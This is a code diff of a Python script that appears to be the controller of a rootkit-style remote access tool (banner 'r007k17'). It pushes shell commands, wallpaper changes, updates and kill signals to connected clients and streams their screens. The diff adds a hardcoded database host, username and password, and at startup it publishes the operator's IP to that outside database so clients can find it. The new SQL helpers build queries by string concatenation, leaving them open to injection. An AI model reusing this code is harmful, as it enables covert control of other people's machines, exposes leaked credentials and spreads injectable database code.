@@ -1,9 +1,59 @@
-import socket
-import os, re, time
+import socket, os, re, time,  threading, pymysql
 from vidstream import StreamingServer
 from inputimeout import inputimeout, TimeoutOccurred
-import threading
+co = ["mysql-lyceestvincent.alwaysdata.net", "116313_msebille", "CMn674pgtFyMKdjPeFLR", "lyceestvincent_msebille"]
 
+
+def insertInto(connexion="", tableName="", content=""):
+    try:
+        if len(connexion) == 4:
+            connection = pymysql.connect(host=connexion[0], user=connexion[1], passwd=connexion[2], database=connexion[3])
+            #database connection
+            cursor = connection.cursor()
+        else:
+            print("connexion isn't complete")
+            return False
+        if type(content[0]) == list:
+            listlist = 1
+        else:
+            listlist = 0
+        if tableName != "" and content!="":
+            if listlist == 1:
+                for i in range(len(content)):
+                    insertinto = """INSERT INTO """+tableName+"("+content[i][0]+") VALUES("+content[i][1]+")"
+                    cursor.execute(insertinto)
+            else:
+                insertinto = """INSERT INTO """+tableName+"("+content[0]+") VALUES("+content[1]+")"
+                cursor.execute(insertinto)
+            connection.commit()
+            connection.close()
+            return True
+    except:
+        connection.close()
+        print("table isn't exist")
+        return False
+def deleteSql(connexion="", tableName="", content=""):
+    try:
+        if len(connexion) == 4:
+            connection = pymysql.connect(host=connexion[0], user=connexion[1], passwd=connexion[2], database=connexion[3])
+            #database connection
+            cursor = connection.cursor()
+        else:
+            print("connexion isn't complete")
+            return False
+        if tableName != "" and content!="":
+            insertinto = """DELETE FROM """+tableName+" "+content
+            cursor.execute(insertinto)
+            connection.commit()
+            connection.close()
+            return True
+    except:
+        connection.close()
+        print("table isn't exist")
+        return False
+
+def getSelfIp(temp=-1):
+    return [ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][temp]
 def testIfIpTrue(data, total=False):
     if total == False:
         datasplit = data.split('.')
@@ -47,15 +97,16 @@ def stopSpaceError(data):
 
 def restart():
     global ipToConnect, ipHost, port
-    ipToConnect = str()
-    ipHost = Ip("return")
-    port = 22228
+    ipToConnect, ipHost, port = str(), Ip("return"), 22228
     print("###################################"+"                                                          connect to "+ipHost)
     print("##### r007k17 by 7r1574n n13l #####")
     print("###################################"+"                                                          port "+str(port))
 def starting():
-    clear()
-    restart()
+    content = "WHERE id = 0"
+    print(deleteSql(co, "test", content))
+    content = ["IP", "'"+getSelfIp()+"'"]
+    print(insertInto(co, "test", content))
+    Ip("modify", [ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][-1])
     ret = None
     if ipHost == "nothing":
         while ret != True:
@@ -151,14 +202,9 @@ def testAll(speed=0.3, other=None):
     command(input(">"))
 
 def testEmptyLine(nameFile):
-    numberLine = (len((open(nameFile,'r')).readlines()))
-    file = (open(nameFile, 'r'))
-    ligne = 0
-    numbsup = 0
-    lignesup = []
+    numberLine, file, ligne, numbsup, lignesup = (len((open(nameFile,'r')).readlines())), (open(nameFile, 'r')), 0, 0, []
     for i in range(numberLine):
-        readln = file.readline()
-        ligne = ligne + 1 
+        readln, ligne = file.readline(), ligne + 1 
         if readln == "\n":
             lignesup.append(ligne)
             numbsup += 1
@@ -195,8 +241,7 @@ def printFileCmd():
 
 def retLineCmd(filename, numberline):
     with open(filename) as fp:
-       line = fp.readline()
-       cnt = 1
+       line, cnt = fp.readline(), 1
        while line:
             if cnt == numberline:
                 return("{}".format(line.strip()))
@@ -225,13 +270,19 @@ def command(commandToExecute):
         elif commandToExecute in ("help", "aide"):
             help("command")
             command(input(">"))
+        elif commandToExecute in ("modify", "modifyip", "ip"):
+            ret = Ip("modify", [ip for ip in socket.gethostbyname_ex(socket.gethostname())[2] if not ip.startswith("127.")][-1])
+            if ret == True:
+                print("#                                 #")
+                print("##########  ip modified  ##########")
+                command(input(">"))
         elif commandToExecuteList[0] in ("modify", "modifyip"):
             if len(commandToExecuteList) > 1 and ("".join(commandToExecuteList[1].split("."))).isdigit() == True:
                 ret = Ip("modify", commandToExecuteList[1])
                 if ret == True:
                     print("#                                 #")
                     print("##########  ip modified  ##########")
-                command(input(">"))
+                    command(input(">"))
             else:
                 print("no ip write")
                 command(input(">"))
@@ -239,7 +290,7 @@ def command(commandToExecute):
             clear()
             restart()
             command(input(">"))
-        elif commandToExecuteList[0] in ("testall", "testAll"):
+        elif commandToExecuteList[0] in ("testall", "testAll", "cmdlist", "listcmd"):
             if len(commandToExecuteList) > 2:
                 if commandToExecuteList[len(commandToExecuteList)-1] in ("speed", "spd"):
                     testAll(speed=0.25, other=commandToExecuteList[1])
@@ -252,7 +303,7 @@ def command(commandToExecute):
                     testAll(other=commandToExecuteList[1])
             else:
                 testAll()
-        elif commandToExecuteList[0] in ("cmd"):
+        elif commandToExecute in ("cmd"):
             try:
                 temp = run
             except:
@@ -317,7 +368,7 @@ def sendData(data):
     global run
     datalist = data.split()
     try:
-        if data in ("die", "kill"):
+        if data in ("die", "kill", "stop"):
             try:
                 client.send("die".encode())
             except:
@@ -325,7 +376,11 @@ def sendData(data):
             run = False
         elif data in ("help", "aide"):
             help("sending")
-        elif data in ("cmd"):
+        elif datalist[0] in ("severalcmd"):
+            client.send(data.encode())
+        elif datalist[0] in ("wallpaper"):
+            client.send(data.encode())
+        elif data in ("command"):
             try:
                 temp = run
             except:
@@ -338,7 +393,13 @@ def sendData(data):
             run = temp
             clear()
             restart()
-        elif datalist[0] in ("cmd"):
+        elif datalist[0] in ("command") and datalist[1] in ("list") or datalist[0] in ("cmdlist", "listcmd"):
+            try:
+                printFileCmd()
+            except:
+                print("no cmd register")
+                print("to register a cmd write register (and enter your cmd here)")
+        elif datalist[0] in ("command"):
             if len(datalist) > 2 and datalist[2].isdigit() == True:
                 datalist[2] = int(datalist[2])
                 sendData(retLineCmd("cmd.txt", datalist[2]))
@@ -374,6 +435,9 @@ def sendData(data):
                 client.send("updelte".encode())
             else:
                 client.send("update".encode())
+        elif data in ("cls", "clear"):
+            clear()
+            restart()
         else:
             client.send(data.encode())
     except:
@@ -466,6 +530,14 @@ while progrun == True:
             server = False
     except:
         pass
-print("prog stop")
-time.sleep(0.5)
+
+clear()
+print()
+print()
+print("###################################")
+print("###########     end     ###########")
+print("###################################")
+print()
+print()
+time.sleep(2)
 exit()
